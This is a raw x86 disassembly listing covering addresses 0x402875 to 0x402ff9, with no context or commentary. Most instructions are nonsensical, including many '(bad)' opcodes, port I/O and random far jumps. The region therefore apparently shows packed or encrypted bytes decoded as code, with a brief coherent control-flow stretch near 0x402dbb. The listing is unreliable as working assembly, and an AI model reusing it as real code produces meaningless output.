  402875:	ret    
  402876:	ror    ecx,cl
  402878:	into   
  402879:	(bad)  
  40287b:	fcmovnbe st,st(1)
  40287d:	out    0x1c,eax
  40287f:	dec    esp
  402880:	stos   BYTE PTR es:[edi],al
  402881:	sbb    BYTE PTR [eax-0x38],dl
  402884:	cmp    DWORD PTR [eax],ecx
  402886:	or     al,0x78
  402888:	js     0x402888
  40288a:	jle    0x402904
  40288c:	js     0x4028f8
  40288e:	addr16 mov dh,0x4e
  402891:	mov    ?,WORD PTR [edx+eax*1]
  402894:	push   esp
  402895:	add    DWORD PTR gs:[esi],eax
  402898:	xchg   edi,eax
  402899:	aam    0x1c
  40289b:	imul   ebp,DWORD PTR [ebx],0xffffffb1
  40289e:	out    dx,eax
  40289f:	les    esp,FWORD PTR [esi-0x77dfa6c9]
  4028a5:	idiv   ebx
  4028a7:	(bad)  
  4028a8:	pop    edi
  4028a9:	push   gs
  4028ab:	or     dl,BYTE PTR [eax]
  4028ad:	jnp    0x402863
  4028af:	cld    
  4028b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4028b1:	mov    eax,ds:0x7b4c3c94
  4028b6:	sbb    BYTE PTR [eax*4-0x5d78af98],ch
  4028bd:	push   0xd57c9fd7
  4028c2:	enter  0xa589,0xcb
  4028c6:	cmp    bh,BYTE PTR [edx]
  4028c8:	data16 ror BYTE PTR [ebx],1
  4028cb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4028cc:	mov    ds:0xb48b2f75,al
  4028d1:	sbb    dl,al
  4028d3:	es pusha 
  4028d5:	xor    esi,ebp
  4028d7:	lahf   
  4028d8:	in     al,dx
  4028d9:	mov    esp,eax
  4028db:	jne    0x4028e6
  4028dd:	cmp    al,0xa3
  4028df:	sti    
  4028e0:	test   eax,0x32d25d20
  4028e5:	add    DWORD PTR [ebx],esp
  4028e7:	(bad)  [edi]
  4028e9:	lea    edi,[edi-0x1acccdd]
  4028ef:	sub    DWORD PTR [ebx+0x3],esp
  4028f2:	jmp    0xa73097d2
  4028f7:	lea    ebp,[esi+ecx*2+0x75]
  4028fb:	sbb    ecx,DWORD PTR [eax]
  4028fd:	jmp    0x402922
  4028ff:	sub    ecx,DWORD PTR [edi+0x183c930e]
  402905:	imul   esp,esi,0xba45d88a
  40290b:	(bad)  [edi]
  40290d:	mov    esp,0xdc9425f0
  402912:	rcr    BYTE PTR [edi+0x4a437aed],0x8d
  402919:	dec    edi
  40291a:	xchg   esi,eax
  40291b:	mov    BYTE PTR [esi-0x5dc305c7],ah
  402921:	mov    eax,DWORD PTR [edi+esi*8]
  402924:	sahf   
  402925:	ins    DWORD PTR es:[edi],dx
  402926:	fadd   QWORD PTR ds:0x3bc09081
  40292c:	xchg   esp,eax
  40292d:	dec    eax
  40292e:	sti    
  40292f:	pusha  
  402930:	mov    eax,ds:0x865344f3
  402935:	xor    al,0x22
  402937:	dec    ebx
  402938:	pop    edx
  402939:	jbe    0x402952
  40293b:	jo     0x4028e2
  40293d:	sbb    DWORD PTR [ecx],0xffffff82
  402940:	mov    WORD PTR [ebp+0x71],fs
  402943:	mov    edx,?
  402945:	(bad)  
  402946:	sub    esp,edx
  402948:	dec    eax
  402949:	iret   
  40294a:	sbb    ebp,DWORD PTR [eax+0x2]
  40294d:	stc    
  40294e:	inc    ebp
  40294f:	cdq    
  402950:	or     BYTE PTR [eax-0x2351c175],bh
  402956:	in     eax,dx
  402957:	icebp  
  402958:	(bad)  
  402959:	stos   BYTE PTR es:[edi],al
  40295a:	int3   
  40295b:	cmp    BYTE PTR [ebx+edx*1],bl
  40295e:	imul   ebx,DWORD PTR [eax-0x5958481b],0xec4aa0c4
  402968:	mov    ah,BYTE PTR [ecx]
  40296a:	scas   al,BYTE PTR es:[edi]
  40296b:	or     al,0x33
  40296d:	lahf   
  40296e:	ss jns 0x402936
  402971:	leave  
  402972:	lahf   
  402973:	xor    DWORD PTR [esi],edi
  402975:	or     ebx,DWORD PTR [ebx+0x14]
  402978:	cli    
  402979:	in     al,0xe5
  40297b:	jmp    0x4647:0xdec52b61
  402982:	mov    eax,0x1a723f2a
  402987:	push   ds
  402988:	xor    cl,BYTE PTR [esi+0x5062167b]
  40298e:	call   0x2b1b6816
  402993:	jno    0x402947
  402995:	jno    0x4029fc
  402997:	sub    eax,0xf13b3144
  40299c:	jle    0x402999
  40299e:	lods   eax,DWORD PTR ds:[esi]
  40299f:	fisttp WORD PTR [eax-0x715d36c8]
  4029a5:	mov    edx,0x4395a358
  4029aa:	dec    esp
  4029ab:	pop    ss
  4029ac:	or     dl,dh
  4029ae:	adc    bh,BYTE PTR [ecx-0x74]
  4029b1:	xor    eax,0x6cb1808e
  4029b6:	std    
  4029b7:	inc    esp
  4029b8:	xchg   ebp,eax
  4029b9:	(bad)  
  4029ba:	push   edx
  4029bb:	lock push ds
  4029bd:	imul   ebp,DWORD PTR [ecx],0xa
  4029c0:	cmp    eax,0x3636122c
  4029c5:	in     al,dx
  4029c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4029c7:	mov    esi,0xbabfb4d2
  4029cc:	aad    0xa
  4029ce:	loope  0x402a45
  4029d0:	in     eax,dx
  4029d1:	cmp    BYTE PTR [ebx-0x18],bh
  4029d4:	jbe    0x4029d4
  4029d6:	jae    0x4029b0
  4029d8:	popa   
  4029d9:	das    
  4029da:	clc    
  4029db:	in     eax,0x71
  4029dd:	(bad)  
  4029de:	fs stos DWORD PTR es:[edi],eax
  4029e0:	out    0xb5,al
  4029e2:	push   ss
  4029e3:	xor    esp,DWORD PTR [eax-0x75481213]
  4029e9:	mov    WORD PTR [eax-0x787594b7],gs
  4029ef:	and    dl,BYTE PTR ds:[ecx]
  4029f2:	mov    BYTE PTR [edx-0x3e],cl
  4029f5:	test   al,0x2a
  4029f7:	push   ecx
  4029f8:	fs cmp ax,0x6923
  4029fd:	js     0x402994
  4029ff:	in     al,dx
  402a00:	cmp    esi,DWORD PTR [esi+ecx*2-0x51]
  402a04:	xchg   esp,eax
  402a05:	mov    ch,0x93
  402a07:	xchg   ecx,eax
  402a08:	sbb    cl,BYTE PTR ds:0xa70bb9d2
  402a0e:	retf   
  402a0f:	jbe    0x402a15
  402a11:	ins    DWORD PTR es:[edi],dx
  402a12:	je     0x4029db
  402a14:	cwde   
  402a15:	push   ebx
  402a16:	sub    esi,DWORD PTR [esi]
  402a18:	sub    ah,ch
  402a1a:	push   ebx
  402a1b:	stos   BYTE PTR es:[edi],al
  402a1c:	jecxz  0x4029b4
  402a1e:	sbb    al,0xd9
  402a20:	pop    ebp
  402a21:	xor    ecx,0xf
  402a24:	adc    al,0xcb
  402a26:	xor    bl,BYTE PTR [eax-0x24]
  402a29:	ja     0x4029c7
  402a2b:	pop    ebp
  402a2c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402a2d:	mov    ah,0x78
  402a2f:	adc    ch,BYTE PTR [edx+0x62]
  402a32:	jecxz  0x402a12
  402a34:	mov    ebx,0x275cb9c3
  402a39:	fsubr  QWORD PTR [ecx+0xb]
  402a3c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402a3d:	test   BYTE PTR [eax+esi*4-0x63842b0a],dh
  402a44:	dec    edi
  402a45:	loopne 0x402a29
  402a47:	inc    edi
  402a48:	ins    DWORD PTR es:[edi],dx
  402a49:	adc    ebx,DWORD PTR [ebx+0x71]
  402a4c:	scas   eax,DWORD PTR es:[edi]
  402a4d:	sub    DWORD PTR [edx],ecx
  402a4f:	xor    eax,0x88bb53b5
  402a54:	(bad)  
  402a55:	lahf   
  402a56:	lahf   
  402a57:	nop
  402a58:	(bad)  
  402a59:	fcmovb st,st(0)
  402a5b:	sbb    esi,DWORD PTR [ebp-0xc]
  402a5e:	jns    0x402ad3
  402a60:	push   eax
  402a61:	cmp    dl,dh
  402a63:	sti    
  402a64:	mov    al,BYTE PTR [ecx]
  402a66:	not    bl
  402a68:	push   ds
  402a69:	push   esi
  402a6a:	fcomp  QWORD PTR [ecx+edx*2]
  402a6d:	add    edx,DWORD PTR [edi-0x2010d6ab]
  402a73:	mov    ecx,0x5b9d4529
  402a78:	or     BYTE PTR [eax],al
  402a7a:	lods   al,BYTE PTR ds:[esi]
  402a7b:	mov    dl,0xfd
  402a7d:	jbe    0x402a2a
  402a7f:	test   eax,0xc820ced2
  402a84:	push   esi
  402a85:	and    ebx,DWORD PTR [ebx-0x61]
  402a88:	test   BYTE PTR [ecx],dl
  402a8a:	jno    0x402ac0
  402a8c:	xlat   BYTE PTR ds:[ebx]
  402a8d:	or     DWORD PTR [esi-0x5989af23],ebx
  402a93:	dec    ebx
  402a94:	jmp    0x402a1f
  402a96:	adc    eax,0x4a40ba55
  402a9b:	mul    BYTE PTR [ebx+0x3e]
  402a9e:	stc    
  402a9f:	mov    ebp,DWORD PTR [edi-0x3bbc545a]
  402aa5:	in     eax,dx
  402aa6:	in     eax,dx
  402aa7:	(bad)  
  402aa8:	jo     0x402a9c
  402aaa:	mov    ?,WORD PTR [ebx-0x75]
  402aad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402aae:	jno    0x402a73
  402ab0:	xlat   BYTE PTR ds:[ebx]
  402ab1:	or     eax,0xd062ca7e
  402ab6:	push   cs
  402ab7:	popf   
  402ab8:	inc    ebp
  402ab9:	and    BYTE PTR cs:[ebx+0x77],al
  402abd:	xor    ebx,DWORD PTR [eax-0x1f]
  402ac0:	pop    esp
  402ac1:	add    ebx,esp
  402ac3:	stos   BYTE PTR es:[edi],al
  402ac4:	mov    dl,0xbe
  402ac6:	push   eax
  402ac7:	and    dh,ah
  402ac9:	icebp  
  402aca:	jo     0x402aac
  402acc:	inc    esp
  402acd:	and    ch,bl
  402acf:	push   ebx
  402ad0:	ins    BYTE PTR es:[edi],dx
  402ad1:	rcr    esp,0xac
  402ad4:	xor    dh,cl
  402ad6:	nop
  402ad7:	xchg   edi,eax
  402ad8:	sbb    BYTE PTR [ebp-0x25],bl
  402adb:	sbb    eax,0xe2d5f700
  402ae0:	cli    
  402ae1:	fisubr WORD PTR [esi-0x718dd2bf]
  402ae7:	inc    ebx
  402ae8:	push   ecx
  402ae9:	ror    DWORD PTR [edx-0x7c],1
  402aec:	push   edx
  402aed:	mov    bh,0xd4
  402aef:	inc    esi
  402af0:	pop    edx
  402af1:	fist   WORD PTR [ebx+0x5b7c2e99]
  402af7:	jle    0x402acd
  402af9:	imul   ecx,DWORD PTR [ebx],0x124a93de
  402aff:	inc    edi
  402b00:	push   ss
  402b01:	xor    DWORD PTR [ebp+0x3b],ecx
  402b04:	repnz adc al,0xa8
  402b07:	xchg   edi,eax
  402b08:	cwde   
  402b09:	adc    al,0x1b
  402b0b:	push   cs
  402b0c:	mov    cl,0xd0
  402b0e:	jmp    0x402b3b
  402b10:	enter  0x9ae9,0x2
  402b14:	add    BYTE PTR [eax],al
  402b16:	ror    al,0xc2
  402b19:	int    0xda
  402b1b:	rcr    ebx,1
  402b1d:	aad    0x7b
  402b1f:	bound  ebp,QWORD PTR [esi+0x37]
  402b22:	and    esp,DWORD PTR [esi]
  402b24:	mov    cl,0x27
  402b26:	mov    ss,WORD PTR [edx]
  402b28:	js     0x402ba2
  402b2a:	(bad)  
  402b2b:	jle    0x402ba5
  402b2d:	js     0x402ba5
  402b2f:	jge    0x402b2a
  402b31:	fdiv   QWORD PTR [eax+0x4e]
  402b34:	cdq    
  402b35:	adc    eax,0xc6a3f845
  402b3a:	xor    al,0x1f
  402b3c:	or     esp,DWORD PTR [ecx]
  402b3e:	stos   BYTE PTR es:[edi],al
  402b3f:	and    BYTE PTR [ebx+0x68d1f816],dh
  402b45:	int3   
  402b46:	sub    al,BYTE PTR [ebx+0x16]
  402b49:	xor    al,0x85
  402b4b:	cdq    
  402b4c:	xchg   ebp,eax
  402b4d:	(bad)  
  402b4e:	fistp  QWORD PTR [edi-0xd]
  402b51:	push   ebx
  402b52:	adc    BYTE PTR [ebx],0xf4
  402b55:	scas   eax,DWORD PTR es:[edi]
  402b56:	in     al,dx
  402b57:	mov    edx,0xd2e954f6
  402b5c:	mov    cl,0x40
  402b5e:	sub    DWORD PTR [ebp+esi*8+0x71031c23],esi
  402b65:	(bad)  
  402b66:	cmp    al,0xf6
  402b68:	push   edi
  402b69:	jmp    0x896011fb
  402b6e:	outs   dx,BYTE PTR ds:[esi]
  402b6f:	push   DWORD PTR [eax-0x16]
  402b72:	dec    esi
  402b73:	xchg   ecx,eax
  402b74:	mov    esp,0x9ba1ef1
  402b79:	dec    esp
  402b7a:	and    bl,BYTE PTR [ecx-0x76]
  402b7d:	lods   al,BYTE PTR ds:[esi]
  402b7e:	mov    cl,0x45
  402b80:	jbe    0x402bdf
  402b82:	pop    ecx
  402b83:	idiv   ebp
  402b85:	fs inc esp
  402b87:	aas    
  402b88:	sub    dh,cl
  402b8a:	repnz add ebp,DWORD PTR [ebx+0x5a802184]
  402b91:	pop    ss
  402b92:	(bad)  
  402b93:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402b94:	and    DWORD PTR [edx-0x65],ecx
  402b97:	test   DWORD PTR [edx+0x3b429a80],ebx
  402b9d:	outs   dx,DWORD PTR ds:[esi]
  402b9e:	(bad)  
  402b9f:	(bad)  [esi]
  402ba1:	mov    esi,0x168693c4
  402ba6:	(bad)  
  402ba7:	es sub eax,0x8504abad
  402bad:	push   0x7f2f200a
  402bb2:	daa    
  402bb3:	clc    
  402bb4:	jmp    0x8b98a4d0
  402bb9:	and    DWORD PTR [edx-0x23],ecx
  402bbc:	data16 jno 0x402c05
  402bbf:	test   DWORD PTR [ecx+ebp*8-0x73],edx
  402bc3:	ds scas al,BYTE PTR es:[edi]
  402bc5:	mov    bh,0x1b
  402bc7:	cmp    ecx,DWORD PTR [ecx+ecx*4+0x75]
  402bcb:	fimul  DWORD PTR [edi+0x5ab7bc2c]
  402bd1:	mov    dh,0xdc
  402bd3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402bd4:	adc    esi,DWORD PTR [ebp-0x31]
  402bd7:	sub    bh,dl
  402bd9:	imul   ebp,DWORD PTR [edx],0x265d645d
  402bdf:	push   ebx
  402be0:	and    ecx,ebx
  402be2:	pop    es
  402be3:	adc    esi,ebx
  402be5:	sti    
  402be6:	loope  0x402c06
  402be8:	out    dx,eax
  402be9:	and    eax,0x8944b492
  402bee:	push   ss
  402bef:	jae    0x402b86
  402bf1:	shr    BYTE PTR [ecx-0x5ca15fb3],cl
  402bf7:	jae    0x402be8
  402bf9:	das    
  402bfa:	or     esi,DWORD PTR [ecx+0x3cce7ab8]
  402c00:	xor    ah,BYTE PTR [ebp-0x7a]
  402c03:	mov    esi,0x93890fd7
  402c08:	or     edx,DWORD PTR gs:[edx+edx*4-0x34]
  402c0d:	daa    
  402c0e:	rcl    BYTE PTR [eax+0x36],0x79
  402c12:	out    dx,eax
  402c13:	popa   
  402c14:	xchg   BYTE PTR [ecx+0x12eaf321],dl
  402c1a:	loope  0x402c9a
  402c1c:	retf   0x5a9a
  402c1f:	xor    al,0xb7
  402c21:	neg    DWORD PTR [ecx+0x2d8cccf2]
  402c27:	jae    0x402c6b
  402c29:	jp     0x402c95
  402c2b:	push   edx
  402c2c:	arpl   bx,di
  402c2e:	cmp    BYTE PTR ds:0x3088485c,bl
  402c34:	cwde   
  402c35:	imul   esi,DWORD PTR [edx],0x10
  402c38:	dec    ebx
  402c39:	xchg   ecx,eax
  402c3a:	adc    DWORD PTR [edi+ebx*4+0x33cc236e],esp
  402c41:	out    dx,al
  402c42:	adc    esp,DWORD PTR [esi]
  402c44:	out    dx,eax
  402c45:	inc    esi
  402c46:	loop   0x402c73
  402c48:	inc    ecx
  402c49:	test   eax,0x11a0b376
  402c4e:	dec    esp
  402c4f:	mov    esp,0xcf7ba9b3
  402c54:	in     eax,dx
  402c55:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402c56:	push   ebp
  402c57:	xor    ah,bl
  402c59:	icebp  
  402c5a:	pop    ebx
  402c5b:	or     BYTE PTR [esi+0x14],0xad
  402c5f:	mov    al,0xf2
  402c61:	adc    al,0x38
  402c63:	je     0x402c6b
  402c65:	jge    0x402c53
  402c67:	mov    edi,0xf334107
  402c6c:	mov    esi,0xa5edd02c
  402c71:	pop    ebx
  402c72:	add    eax,0xb0ad7dbd
  402c77:	test   DWORD PTR [eax],edi
  402c79:	mov    DWORD PTR [esi+0x2adc508],edi
  402c7f:	push   ecx
  402c80:	push   esp
  402c81:	ss daa 
  402c83:	(bad)  
  402c84:	sti    
  402c85:	mov    eax,ds:0x37015cd8
  402c8a:	retf   0x2e4f
  402c8d:	das    
  402c8e:	outs   dx,BYTE PTR ds:[esi]
  402c8f:	adc    al,0xda
  402c91:	test   DWORD PTR [edi+0x45],ebx
  402c94:	ins    BYTE PTR es:[edi],dx
  402c95:	mov    esp,DWORD PTR [ebx+0x77]
  402c98:	and    al,0xea
  402c9a:	cld    
  402c9b:	(bad)  [eax]
  402c9d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402c9e:	aaa    
  402c9f:	pusha  
  402ca0:	lods   al,BYTE PTR ds:[esi]
  402ca1:	adc    al,0x28
  402ca3:	sti    
  402ca4:	mov    ah,0x52
  402ca6:	cli    
  402ca7:	ins    BYTE PTR es:[edi],dx
  402ca8:	dec    ecx
  402ca9:	add    DWORD PTR [esi-0x42],ebx
  402cac:	fld    TBYTE PTR [eax-0x5a5f28aa]
  402cb2:	loopne 0x402cc7
  402cb4:	nop
  402cb5:	mov    DWORD PTR [edx+ecx*4-0x42],ebx
  402cb9:	fidiv  DWORD PTR [esi+eiz*8]
  402cbc:	ret    
  402cbd:	pop    ebx
  402cbe:	retf   
  402cbf:	fcomp  QWORD PTR [eax-0x73]
  402cc2:	je     0x402cbd
  402cc4:	sub    eax,0xe0d9845f
  402cc9:	retf   
  402cca:	xchg   BYTE PTR [ebp+0x576abd6d],cl
  402cd0:	xchg   ebp,eax
  402cd1:	retf   0xc10d
  402cd4:	push   ebp
  402cd5:	sbb    eax,0xf5b60b85
  402cda:	daa    
  402cdb:	mov    eax,0xddc985e4
  402ce0:	jmp    0x878a:0x8bd9830b
  402ce7:	or     edi,esp
  402ce9:	xchg   edi,eax
  402cea:	add    eax,0xd364926d
  402cef:	mov    ecx,0xccf3ce37
  402cf4:	out    dx,al
  402cf5:	stc    
  402cf6:	push   0xd4867481
  402cfb:	outs   dx,BYTE PTR ds:[esi]
  402cfc:	stos   BYTE PTR es:[edi],al
  402cfd:	daa    
  402cfe:	imul   edi,DWORD PTR [ebx+0x71],0xa
  402d02:	xor    al,0xfb
  402d04:	repz enter 0xd89e,0xba
  402d09:	jg     0x402d1c
  402d0b:	loope  0x402cb7
  402d0d:	xor    edx,DWORD PTR [ebp+0x25]
  402d10:	jmp    0x1560:0xfcdecfa6
  402d17:	add    eax,0x79a47852
  402d1c:	sbb    esp,eax
  402d1e:	call   0xecd18cd0
  402d23:	adc    edx,DWORD PTR [ecx+ebp*1]
  402d26:	int3   
  402d27:	out    dx,eax
  402d28:	mov    bl,0xf5
  402d2a:	push   ecx
  402d2b:	inc    ebp
  402d2c:	imul   ecx,DWORD PTR [edi],0x11423bfa
  402d32:	xor    DWORD PTR [ecx-0x5b108606],edi
  402d38:	pop    esp
  402d39:	sub    BYTE PTR [ebx+0x1810870f],bh
  402d3f:	adc    BYTE PTR [edx+0x29],cl
  402d42:	sbb    eax,0x910ef6db
  402d47:	repnz lods eax,DWORD PTR ds:[esi]
  402d49:	jmp    0x402d8d
  402d4b:	jmp    0x8f13:0x2d08b917
  402d52:	or     DWORD PTR [ebx+0x5104d76],eax
  402d58:	inc    eax
  402d59:	cld    
  402d5a:	pop    esp
  402d5b:	sub    BYTE PTR [ecx],ch
  402d5d:	loop   0x402d9e
  402d5f:	loopne 0x402d1c
  402d61:	ss push es
  402d63:	add    bh,BYTE PTR [ebx-0x48]
  402d66:	add    esp,edx
  402d68:	push   ss
  402d69:	sar    BYTE PTR ds:0x15342ae5,cl
  402d6f:	sbb    ebp,DWORD PTR [eax-0x70b4a8a6]
  402d75:	in     eax,dx
  402d76:	push   0xb9a08fcf
  402d7b:	adc    esi,DWORD PTR ds:[bp+si]
  402d7f:	hlt    
  402d80:	(bad)  
  402d82:	adc    eax,0xf62a96c2
  402d87:	lods   al,BYTE PTR ds:[esi]
  402d88:	adc    al,dl
  402d8a:	sub    esp,edx
  402d8c:	es call 0xeacde96c
  402d92:	lds    eax,FWORD PTR [ecx+0xdf7cbfd]
  402d98:	pusha  
  402d99:	aas    
  402d9a:	sbb    ecx,DWORD PTR [ecx+0x57]
  402d9d:	int3   
  402d9e:	xchg   ecx,eax
  402d9f:	mov    BYTE PTR [edx-0x62],dh
  402da2:	stos   DWORD PTR es:[edi],eax
  402da3:	pop    ecx
  402da4:	es out 0x91,eax
  402da7:	xchg   bh,bh
  402da9:	loope  0x402dd2
  402dab:	in     al,0xf6
  402dad:	leave  
  402dae:	cmp    esi,DWORD PTR [edx-0x769930d5]
  402db4:	dec    ebp
  402db5:	cld    
  402db6:	jmp    0x402dc8
  402dbb:	xor    eax,esi
  402dbd:	lea    eax,[eax+ecx*1+0x327298]
  402dc4:	mov    WORD PTR [ebp-0x4],ax
  402dc8:	mov    eax,DWORD PTR [ebp-0xc]
  402dcb:	cmp    eax,ebx
  402dcd:	je     0x403080
  402dd3:	mov    eax,DWORD PTR [ebp-0x8]
  402dd6:	mov    DWORD PTR [eax],0x60341eb0
  402ddc:	jmp    0x404380
  402de1:	jmp    0x403080
  402de6:	(bad)  
  402de7:	leave  
  402de8:	(bad)  
  402de9:	vpsubusw xmm2,xmm4,xmm5
  402ded:	leave  
  402dee:	repnz int 0x29
  402df1:	cld    
  402df2:	lahf   
  402df3:	and    eax,0x170c637e
  402df8:	js     0x402e72
  402dfa:	(bad)  
  402dfb:	jle    0x402e75
  402dfd:	js     0x402dea
  402dff:	cmp    BYTE PTR [ecx-0x19],al
  402e02:	jp     0x402ddb
  402e04:	out    0x8,al
  402e06:	mov    ebx,DWORD PTR [ebx+0x661c4b74]
  402e0c:	lock xor BYTE PTR [esi+edx*1-0x73085350],bl
  402e14:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402e15:	or     bl,BYTE PTR [edx+0x8a7a55e]
  402e1b:	push   ss
  402e1c:	hlt    
  402e1d:	int3   
  402e1e:	jmp    esp
  402e20:	fcom   QWORD PTR [edx-0x26]
  402e24:	push   es
  402e25:	je     0x402e47
  402e27:	and    eax,0x4da671bb
  402e2c:	mov    ecx,0x62397fee
  402e31:	scas   eax,DWORD PTR es:[edi]
  402e32:	jnp    0x402e8d
  402e34:	inc    ecx
  402e35:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402e36:	cli    
  402e37:	stos   DWORD PTR es:[edi],eax
  402e38:	jmp    0x402e66
  402e3a:	mul    BYTE PTR [ebx+ecx*1+0x6d8c6c26]
  402e41:	in     eax,0x67
  402e43:	cmp    DWORD PTR [ecx+edx*1+0x17],ebp
  402e47:	xor    eax,0x4b68ee1f
  402e4c:	xchg   ebx,eax
  402e4d:	or     al,0x66
  402e4f:	xchg   esp,eax
  402e50:	rcl    DWORD PTR [eax],1
  402e52:	push   ecx
  402e53:	sbb    edx,DWORD PTR [ebx]
  402e55:	dec    edx
  402e56:	adc    al,0x63
  402e58:	pushf  
  402e59:	ins    BYTE PTR es:[edi],dx
  402e5a:	fimul  WORD PTR [ebx+0x4428c3f1]
  402e60:	retf   0xa59d
  402e63:	(bad)  
  402e64:	and    DWORD PTR [edi+edi*4],edx
  402e67:	push   ebp
  402e68:	xor    eax,0x1934e6c7
  402e6d:	fxch   st(0)
  402e6f:	xchg   edi,eax
  402e70:	push   ss
  402e71:	imul   eax,eax,0x68
  402e74:	faddp  st(4),st
  402e76:	jbe    0x402df8
  402e78:	cmp    al,0x6d
  402e7a:	dec    cx
  402e7c:	adc    al,0x3a
  402e7e:	cmp    edx,edx
  402e80:	sub    eax,0x66d9a44e
  402e85:	cdq    
  402e86:	jnp    0x402e9d
  402e88:	ret    0xa2d4
  402e8b:	sbb    DWORD PTR [edi-0x72],ecx
  402e8e:	wbinvd 
  402e90:	(bad)  [eax]
  402e92:	sti    
  402e93:	pop    ss
  402e94:	out    dx,al
  402e95:	pop    ds
  402e96:	fisub  DWORD PTR [eax-0xce25d08]
  402e9c:	out    0x22,al
  402e9e:	pushf  
  402e9f:	and    dl,bl
  402ea1:	xchg   ebx,eax
  402ea2:	add    al,0xc5
  402ea4:	push   cs
  402ea5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402ea6:	mov    ds:0x39486f7f,eax
  402eab:	pop    es
  402eac:	pop    esp
  402ead:	and    al,0x85
  402eaf:	stos   DWORD PTR es:[edi],eax
  402eb0:	xchg   ecx,eax
  402eb1:	es mov esi,0x88d36eb2
  402eb7:	mov    dl,0x50
  402eb9:	and    eax,0x8d39bd5c
  402ebe:	pop    ebx
  402ebf:	ss sbb eax,0xd03711df
  402ec5:	pop    ss
  402ec6:	popa   
  402ec7:	add    ebx,ebp
  402ec9:	sbb    BYTE PTR [ecx-0x22cd2e7a],dh
  402ecf:	sub    al,cl
  402ed1:	xchg   DWORD PTR [esi],ebp
  402ed3:	push   ebx
  402ed4:	in     al,0x91
  402ed6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402ed7:	test   DWORD PTR [eax+0x32b958db],ebx
  402edd:	sbb    edx,ecx
  402edf:	fwait
  402ee0:	adc    al,0xde
  402ee2:	shr    DWORD PTR [ebp+0x9f7b461],0x93
  402ee9:	(bad)  
  402eea:	mov    al,ds:0x68a63e6a
  402eef:	mov    dl,0xdf
  402ef1:	cmp    bh,ch
  402ef3:	mov    ds:0x3c7f7ce8,al
  402ef8:	cmc    
  402ef9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402efa:	or     DWORD PTR [edx-0x312f56f2],edx
  402f00:	xor    al,BYTE PTR [ebp+esi*1+0x64b9789e]
  402f07:	pop    esp
  402f08:	jle    0x402f5f
  402f0a:	dec    ebx
  402f0b:	pop    esi
  402f0c:	adc    DWORD PTR [esi+0x523b5a2d],ecx
  402f12:	add    ecx,DWORD PTR [eax]
  402f14:	aas    
  402f15:	push   cs
  402f16:	mov    al,ds:0x29fb82fe
  402f1b:	pop    eax
  402f1c:	not    DWORD PTR [edi+0x4126d59]
  402f22:	pop    ebx
  402f23:	(bad)  
  402f24:	push   ebx
  402f25:	enter  0xc4ef,0x98
  402f29:	xlat   BYTE PTR ds:[ebx]
  402f2a:	fild   DWORD PTR [esi+0x172e4585]
  402f30:	jns    0x402f8d
  402f32:	push   ss
  402f33:	cmp    al,0xc
  402f35:	mov    bl,0x1
  402f37:	in     eax,dx
  402f38:	dec    edi
  402f39:	push   ebp
  402f3a:	in     eax,dx
  402f3b:	shr    ch,1
  402f3d:	adc    al,0xfd
  402f3f:	push   0x7137e1b7
  402f44:	dec    esp
  402f45:	dec    esi
  402f46:	push   edx
  402f47:	sbb    edi,esi
  402f49:	ds xor eax,0xa3a0b50d
  402f4f:	cmp    cl,BYTE PTR [edx+0x4e]
  402f52:	(bad)  [ebx+ecx*2-0x446091fa]
  402f59:	sub    eax,0x199b283c
  402f5e:	call   DWORD PTR [eax-0x4e87faed]
  402f64:	mov    ebp,0x92ffea74
  402f69:	add    DWORD PTR [edx-0x19],eax
  402f6c:	fwait
  402f6d:	sti    
  402f6e:	push   esi
  402f6f:	or     eax,DWORD PTR [ebp-0x56967cef]
  402f75:	jns    0x402f68
  402f77:	inc    esp
  402f78:	mov    edx,0xe6f11169
  402f7d:	aas    
  402f7e:	ja     0x402f91
  402f80:	inc    eax
  402f81:	or     BYTE PTR [esi],bh
  402f83:	stos   DWORD PTR es:[edi],eax
  402f84:	push   0xffffffcd
  402f86:	jmp    0x59942b96
  402f8b:	xchg   ecx,eax
  402f8c:	enter  0x69cd,0x77
  402f90:	inc    edi
  402f91:	cwde   
  402f92:	dec    edi
  402f93:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402f94:	pop    ss
  402f95:	cmp    DWORD PTR [edx+0x48],esp
  402f98:	xchg   esp,eax
  402f99:	aas    
  402f9a:	shl    DWORD PTR [ebx+0x13],1
  402f9d:	sub    edi,DWORD PTR [eax+ecx*2+0x7e4478b7]
  402fa4:	call   0x6400:0x39eedbdd
  402fab:	sar    esp,0x9a
  402fae:	and    eax,0x3181b2ad
  402fb3:	out    0x49,al
  402fb5:	xor    DWORD PTR [esi],0xffffffaa
  402fb8:	fs mov esi,0x998987b8
  402fbe:	jg     0x402ff3
  402fc0:	and    edi,DWORD PTR [ebx+0x603c1492]
  402fc6:	jmp    0x151d:0x3c8fc316
  402fcd:	jp     0x40300a
  402fcf:	xchg   ecx,eax
  402fd0:	dec    ecx
  402fd1:	fcom   QWORD PTR [edx+0x49e7953d]
  402fd7:	fdivr  QWORD PTR [ebx]
  402fd9:	push   0xffffffb6
  402fdb:	mov    bh,0xf2
  402fdd:	pop    esi
  402fde:	mov    ch,0x40
  402fe0:	jle    0x402fed
  402fe2:	ss in  eax,dx
  402fe4:	int    0x16
  402fe6:	daa    
  402fe7:	xor    bl,BYTE PTR [ebx]
  402fe9:	mov    DWORD PTR [ecx+0x52],edi
  402fec:	jle    0x402f82
  402fee:	xchg   ecx,eax
  402fef:	(bad)  
  402ff0:	mov    eax,0xc492e43a
  402ff5:	add    esp,DWORD PTR [ecx]
  402ff7:	xchg   ecx,eax
  402ff8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402ff9:	xchg   ecx,eax
